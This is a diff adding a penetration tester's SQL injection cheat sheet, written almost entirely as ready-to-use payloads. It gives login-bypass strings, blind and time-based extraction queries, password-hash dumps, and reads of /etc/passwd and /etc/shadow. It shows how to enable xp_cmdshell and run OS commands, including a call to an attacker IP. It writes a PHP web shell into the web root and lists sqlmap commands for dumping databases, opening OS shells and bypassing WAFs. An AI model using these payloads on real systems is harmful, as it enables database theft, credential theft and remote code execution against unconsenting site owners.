@@ -1,1 +1,447 @@
+SQL Injection:
+	SQL Injection Characters:
+		' or " 		Character String Indicators
+		-- or #		Single line Comment
+		/*...*/		Multi-line Comment
+		+		Addition, concatenate (or space in a url)
+		-		subtracation
+		=		Equality operator
+		<>!=		Inequality operators
+		><		Greater than and less than operators
+		()		Expression or hierarchy delimitor
+		||		(double pip) concatenate in Oracle and Postgres
+		%		wildcard attribute indicator
+		,		list item separator
+		@, @@		Local and Global variable indicators
+		.		Identifer qualifer seperator
+		PRINT		Useful as non transactional command
+		@variable	Local Variable
+		@@variable	Global Variable
+		waitfor delay '0:0:10'	time delay
+		'IF USER='dbo' %20waitfor%20delay'0%3a0%3a20'--
 
+		; IF (ASCII(lower(substring((USER),1,1)))>97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+
+	Difference between Databases:
+			MS Sql		MySQL		Access		Oracle		Postgres
+	Concatenate	''+''		concat		""&""		''||''		''||''
+	strings				("","")
+	
+	Null		isnull()	ifnull()	iff(isnull())	ifnull()	COALESCE()
+	replace
+
+	Position	CHARINDEX	LOCATE()	InStr()		InStr()		TEXTPOS()
+
+	Op Sys		xp_cmdshell	select into	#date#		utf_file	Call
+	Interaction			outfile /
+					dumpfile
+
+	Cast		Yes		No		No		No		Yes
+
+	Union		Yes		Yes		Yes		Yes		Yes
+
+	Subselects	Yes		Yes 4.1+	No		Yes		Yes
+
+	Batch Queries	Yes		No		No		No		Yes
+
+	Default Stored	Yes		No		No		Yes		No
+	Procedures
+
+	Linking DBs	Yes		Yes		No		Yes		No
+
+
+	Finding out User Privilege Level:
+		user
+		current_user
+		session_user
+		system_user
+
+		' and 1=user --
+		'; if user ='dbo' waitfor delay '0:0:5' --
+		' union select if ( user() like 'root@%', benchmark(50000,sha1('test')),'false');
+
+	Retrieving a Password Hash:
+		Oracle:	`union all select 1,1,username,password from dba_users where `'=`
+
+		MySQL:	`union all select User,Password,'text','text' from mysql.user where `'=`
+
+		MSSQL:	`union all select name,password,`text',1 from syslogins where `'=`
+			`union all select name,password,`text',1 from sysxlogins where `'=`
+
+		Read/Write Local files Using SQL Injection:
+			MySQL:	' union select load_file('/etc/passwd'),1 #
+
+			MSSQL:	BULK INSERT temp FROM 'C:\test' --
+	
+			Oracle:	UTL_
+
+
+	Example MSSQL injection with OS Interacation:
+		'; exec master.xp_cmdshell 'netstat -an > temp.txt' --
+		'; CREATE TABLE tmp (txt varchar(8000));
+		   BULK INSERT tmp FROM 'temp.txt'
+		      with (rowterminator = "\n\n\n\n")--
+		'and 1 in (select txt from tmp) --
+		'; drop table tmp--
+
+
+	Example SQL Injection:
+	    30000' select name from sysobjects--
+	    30000' select name from syscolumns--
+	    30000' exec sp_makewebtask '
+	    30000' ; exec xp_cmdshell --
+	    30000' having 1=1--
+
+	SQL Injection cheat sheet:
+		http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+
+	Errors:
+		Oracle	-Always starts with ORA-0xxx"
+		MS SQL	-Incorrect Syntax near `
+		MySQL	-You have an error in your SQL syntax
+
+	Standard SQL Commands:
+	   Select to retrieve records:
+		select chrName, chrPhone from tblUsers;
+	   insert to add records to a database:
+		insert into "tblUsers" (chrName, chrPhone) values ("jim", "303");
+	   update to modify existing records:
+		update <tablename> set <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567" where chrName = "Kevin";
+	   To update multiple columns:
+		update <tablename> set <columnname> = "<newdata>", <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567", charity = "Tulsa" where chrNmae = "Kevin";
+
+	SELECT		-Query the data and return the results
+			 SELECT * FROM table INTO dumpfile '/result.txt';
+	CREATE		-Create some db object liek a record, tables, stored-
+			 procedures, etc...
+	UPDATE		-Update an existing database object (such as a record)
+	DROP		-Delete data (drop user_table;)
+	SHUTDOWN	-stop the server
+	AND		-logical joining of two part of a query
+	OR		-logical joining of two parts of a query
+	UNION		-join the results of two queries (number of fields must
+			 be equal
+			 ' union select load_file ('/etc/shadow'),1 #
+	INSERT		-Insert Data into DB
+			 You don't know the db schema so you need to guess the
+			 number of fields:
+				foo');--
+				foo',1)--
+				foo',1,1);--
+	;		-finish the sql statment - and possibly start another 
+				; shutdown;--
+	--		-comment delimiter for some databases (not all).  Often
+			 used to "get rid of the rest of a canned SQL query...
+	IF		-conditional statement - helpful in blind SQL injection
+	SUBSTRING	-Select a part of the string - helpful in blind SQL
+			 injections	
+	WAITFOR		-Cause a time delay
+
+	' or ''='' or''='		#SQL Injection for Login and Password field
+	' or '1=1''			#Put in both the login and Password field
+	1<2 and "Brenna"="Brenna"	#other injections that are always true
+
+
+
+	%09 (which is a tab or ht) can be used instead of spaces if spaces are 
+		filtered when writing injection string
+
+	Also, try eleminating spaces:
+		admin'or'1'='1#			use # instead of --
+
+
+
+	Useful SQL Elements that indicate a comment:
+		--
+		#
+		/* 
+	Values of OR TRUE:
+		' or 1=1
+		" or 1=1
+		' or 'a' = 'a
+		') or ('a'=a
+	select * from inventory where sku='' or 1=1--';
+
+	[o] show rows starting with this offset
+	[r] rows of output to display
+	MySQL	WHERE id = 0 UNION SELECT 'data' LIME [o], [r]
+	MSSQL	WHERE id = 0 UNION SELECT 'TOP [r] 'data' WHERE
+			data_column NOT in (SELECT TOP [o] 'data')
+
+
+	Additional SQL Elements
+	;	support for multiple queries...just like bash
+
+	Union	take the results of two searches and merge them in to one set
+		of results.  
+		select * from inventory where sku='' UNION select * from users
+			where 1=1;--';
+		
+		select * from inventory where sku='' UNION select (name, id, 1
+			, 1, 1) from users where 1=1;--';
+
+		UNION select statments must have the same number of columns or
+			they will error out.  by using a *,1 we can pad columns
+			so that they end up matching
+			" union select *,1 from accounts /*
+
+	MS SQL
+		select name from master..sysobjects where xtype ='U';
+		select top 1 table_name from information_schema.tables;
+
+		 WAITFOR DELAY '0:0:10'--
+			 ProductID=1;waitfor delay '0:0:10'--
+			 ProductID=1);waitfor delay '0:0:10'--
+			 ProductID=1';waitfor delay '0:0:10'--
+			 ProductID=1');waitfor delay '0:0:10'--
+			 ProductID=1));waitfor delay '0:0:10'--
+			 'IF USER='dbo' %20waitfor%20delay'0%3a0%3a20'--
+
+		category=W’or(substring((select @@version),1,1))='m
+
+		Get SQL Version:
+		category=W%27or%28select%20@@version%29like%27%252008%25
+		category=W'or(select @@version)like'%2008%
+
+		Get User:
+		'category=W’or(select user)='sa
+		'category=W’or(select user)='dbo
+		
+		Get host name of server.  Run through ‘cluster bomb’ in burp. The first §1§ and §a§ for positions
+		'or(substring((select%20host_name()),1,1))%3D’a
+		
+		Get database name.  Run through ‘cluster bomb’ in burp. The first §1§ and §a§ for positions
+		'or(substring((select%20db_name()),1,1))%3D'a
+
+
+		OS Interaction via SQL injection on MS SQL
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; Create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		' and 1 in (select outp from results) --
+
+		Enable xp_cmdshell if it is disabled
+			EXEC sp_configure 'show advanced options', 1;
+			RECONFIGURE;
+			EXEC sp_configure 'xp_cmdshell', 1;
+			RECONFIGURE;
+	
+			Enable:
+			';EXEC sp_configure 'show advanced options', 1--
+			';RECONFIGURE--
+			';EXEC sp_configure 'xp_cmdshell', 1--
+			';RECONFIGURE--
+
+			Disable:
+			';EXEC sp_configure 'show advanced options', 1--
+			';RECONFIGURE--
+			';EXEC sp_configure 'xp_cmdshell', 0--
+			';RECONFIGURE--
+
+
+	Oracle
+		select table_name from user_tables;
+	
+	MySQL
+		select table_schema,table_na,e from infromation_schema.tables;
+
+SQL Injection Cheat Sheet
+	http://pentestmonkey.net
+
+Mavi Tuna -> good sql injectin cheat sheet
+
+Havij -> windows based SQL injection tool
+		http://itsecteam.com/en/projects/project1.htm
+
+
+SQL Injection to perform Command Injection
+	MS SQL
+		exec master..xp_cmdshell 'ping [attackerIP]' --
+
+		exec master..sp_makewebtask \\[attackerIP]\share\results.html, "
+			select * from information_schema.tables"
+
+	MySQL
+		and 1=0 union select '[PHP code]' INTO OUTFILE 
+			'/var/www/html/mycode.php'
+
+Guessing letters in the table name via Blind SQL Injection
+	and substring((select top 1 name from master..sysobjects where xtype='
+		U'),1,1)>'m'
+			This asks if the first letter is m, keep trying until
+			you get the correct letter.
+			Then change to 2,1 and try again to get the 2nd letter
+			then change to 3,1 and try again, etc, etc
+
+Example SQL Injection on a PHP site with MySQL backend:
+	"
+	" or 1=1 /*		We learned that there are 6 colums
+	" union select * from accounts /*
+	" union select *,1 from accounts /*	We pad with 1's until we get 6
+	" union select "hello world", "", "", "", "", "" /*
+	" union select "<?php system(\"ping -c 4 1.1.1.1\");", "", "", "", "",
+		"" into outfile "/var/www/html/haxor.php" /*
+			This creates a file that you can access on the website
+			that will ping your IP 1.1.1.1; http://site/haxor.php
+	" union select "<?php if (isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","","","","","" into outfile "/var/www/html/haxor2.php" /*
+		This is a command injection page that will let you execute any
+			command you want.  Access http://site/haxor2.php
+
+
+	
+Blind SQL Injection Examples:
+		index.php?itemid=9	Returns data about a specific item #9
+		index.php?itemid='	Returns no item found message
+		index.php?itemid=9' and 1=1; --	  Returns data about item #9
+		index.php?itemid=9' and 1=0; --   Returns a no item found message
+
+Absinthe	Blind and Normal SQL injection tool
+
+
+Fingerprinting the Database:
+	Master database adn schema tables:
+		MS SQL 		-> select name from master..sysobjects where xtype = 'U';
+		Oracle		-> select tables_name from user_tables;
+		PostgreSQL	-> select relname from pg_class;
+		MySQL		-> select Select_priv from mysql.dlb;
+
+	MySQL -> ' union select load_file('/etc/shadow'),1 #
+		select * from table into outfile '/result';
+		
+	MSSQL -> BULK INSERT table FROM 'c:\boot.ini' --
+
+	PostGRES -> COPY mydata FROM '/etc/passwd';
+		    COPY mydata TO '/tmp/data';
+
+	OS Interaction in 4 commands:
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		'; and 1 in (select outp from results) --
+
+SQL Injection examples:
+	'%2bbenchmark(20000000%2csha1(1))%2b'
+	%20and%20benchmark(20000000%2csha1(1))--%20
+	%20or%202371%3d2371
+
+	SELECT * FROM users WHERE username='[username]' and password='[password]'
+		if you inject a \ in the username field it will escape the second ' around 
+		username.  This will make the username field actually be:
+			' and password=
+		now in the password field enter:
+			or 1=1 #
+
+	
+
+
+SQLMap	Tool for Blind and Normal SQL injection.  Will provide an OS
+	Shell.  It is a part of w3af
+	http://sqlmap.sourceforge.net
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --users
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --current-user
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin —-privileges
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin —-roles
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --current-db
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --tables
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --columns
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --schema
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --passwords
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --comments #retrieve DBMS comments
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --is-dba
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --file-read=/etc/hosts
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --sql-shell
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-shell
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-cmd=<OS Command> 
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-pwn --msf-path /framework3      #meterpreter 
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --priv-esc    #privilege escalation
+
+
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2"
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2” --dbs
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff --tables
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff –T items --dump
+		stuff is the DB name
+		items is the Table name
+
+	Tamper Scripts:
+		MSSQL 
+--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+		MYSQL 
+--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
+		General 
+--tamper=base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+		Oracle
+--tamper=between,charencode,equaltolike,greatest,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
+
+
+
+
+	Basic support for REST-style URL parameters by using the asterisk (*) to mark where to 
+	test for and exploit SQL injection
+	./sqlmap.py -u "http://site.com/param1/param2/param3*/param4
+		sqlmap will test injection points at the *
+
+
+	./sqlmap.py --dump-all -g "site:site.org ext:php"
+		dumps all information from google about the web site with php pages
+		then attempts to sql inject the parameters
+
+	./sqlmap.py -u http://site.org/index.php?param= --method="POST" --dbms=mysql --dump-all --level=5 --risk=3 --data=blablalba --cookie="blablabl"
+		-u URL
+		--data 		data string to be sent through POST
+		--cookie	HTTP cookie header
+		--level=5 	Level of tests to perform (1-5, default 1)
+		--risk=3	Risk of tests to perform (1-3, default 1)
+		--dump-all	Dump all DBMS database tables entries 
+		--dump <db name> Dump Database by name
+		--method="POST"	use POST method
+
+	./sqlmap.py -u http://192.168.0.103/HacmeBank_v2_Website/aspx/login.aspx --dump-all --level=5 --risk=3 --data="__VIEWSTATE=dDwtarPj9BldRpGQdExe&txtUserName=&txtPassword=&btnSubmit=Submit"	
+
+	SQLmap -> can take logs from burp
+		./sqlmap.py -l /tmp/burp.log --scope="site.org"
+		--prefix="')"	-> tell burp all queries begin with this
+		--suffix=" AND ('a'='a"
+		--technique=BT
+			Default: BEUST
+			B boolean
+			E error
+			U union
+			S stacked query
+			T timing
+		--replicate	-> replicates db in sqlite3
+		--dump
+		-T <table> 	-> dump table by name
+		-C <column name> 
+		--level=5
+		--risk=3
+		--flush-session	  -> flush stored data from existing scans
+		--string="<text>" -> indicates to sqlmap a valid query
+
+		--check-payload  ->helps bypass WAF
+
+	--check-waf	 ->looks at responses to see if blocking is occuring
+	Tamper Scripts
+		/opt/samurai/sqlmap/tamper/
+		apostrophemask.py
+		space2plus.py
+		etc
+	--tamper tamper/randomcomments.py
+	--tables -> lists tables in the DB
+	can crack mysql hashed passwords
+
+	burp suite plugin:
+		http://blog.buguroo.com/?p=2471&lang=en
+		Right click and say 'send to sqlmap' within burp
+
+
+DB2 Load file:
+	create table ldtest (t varchar(2000))
+	load from /etc/passwd of del insert into ldtest
+	select * from ldtest
